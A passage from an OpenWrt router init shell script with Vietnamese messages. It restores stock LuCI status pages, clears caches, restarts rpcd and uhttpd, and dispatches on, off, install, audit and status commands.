        elif [ -d /www/luci-static/resources/view/status/include.stock ]; then
            cp -f /www/luci-static/resources/view/status/include.stock/*.js /www/luci-static/resources/view/status/include/ 2>/dev/null
        fi
        rm -rf /tmp/luci-indexcache* /tmp/luci-modulecache* 2>/dev/null
        /etc/init.d/rpcd restart >/dev/null 2>&1 &
        /etc/init.d/uhttpd restart >/dev/null 2>&1 &
        echo "[ALL] Modem 5G Watchdog & logall dang chay doc lap 24/7."
    fi
}

start() {
    kill_all_processes
    echo $$ > "$RUN_LOCK"
    start_logic
    if [ -f /etc/config/all_disabled ]; then
        echo "[ALL] Giao dien Master dang o che do TAT. Khoi phuc Theme Argon mac dinh..."
        rm -f /www/luci-static/resources/view/status/include/10_weather.js
        if [ -d /rom/www/luci-static/resources/view/status/include ]; then
            cp -f /rom/www/luci-static/resources/view/status/include/*.js /www/luci-static/resources/view/status/include/ 2>/dev/null
        elif [ -d /www/luci-static/resources/view/status/include.stock ]; then
            cp -f /www/luci-static/resources/view/status/include.stock/*.js /www/luci-static/resources/view/status/include/ 2>/dev/null
        fi
        rm -rf /tmp/luci-indexcache* /tmp/luci-modulecache* 2>/dev/null
        /etc/init.d/rpcd restart >/dev/null 2>&1 &
        /etc/init.d/uhttpd restart >/dev/null 2>&1 &
        echo "[ALL] Modem 5G Watchdog & logall dang chay doc lap 24/7."
    fi
}

stop() {
    disable_all_script
}


# ==============================================================================
# UNIVERSAL CLI DISPATCHER
# Ho tro thuc thi doc lap khi khong qua rc.common (vi du: all on, all off, all status)
# ==============================================================================
if [ -z "$initscript" ]; then
    CMD="${1:-start}"
    case "$CMD" in
        on|enable)
            enable_all_script
            ;;
        off|disable)
            disable_all_script
            ;;
        start|boot)
            start "$@"
            ;;
        stop|shutdown)
            disable_all_script
            ;;
        restart|reload)
            enable_all_script
            ;;
        install)
            echo "======================================================"
            echo " [ALL-IN-ONE] CAI DAT MASTER SYSFIXTINE CHO ROUTER"
            echo "======================================================"
            rm -f /etc/config/all_disabled
            start
            echo ">> Cai dat va kich hoat thanh cong tren moi kien truc!"
            ;;
        audit|test)
            if [ -f "/tmp/test_all_scenarios.sh" ]; then
                sh /tmp/test_all_scenarios.sh
            elif [ -f "/usr/bin/game_booster.sh" ]; then
                /usr/bin/game_booster.sh
            else
                echo ">> Test script chua san sang. Vui long chay 'sh $0 start' truoc."
            fi
            ;;
        status)
            check_all_status
            ;;
        *)
            echo "Su dung: $0 {on|off|status|start|stop|restart|install|audit}"
            ;;
    esac
fi
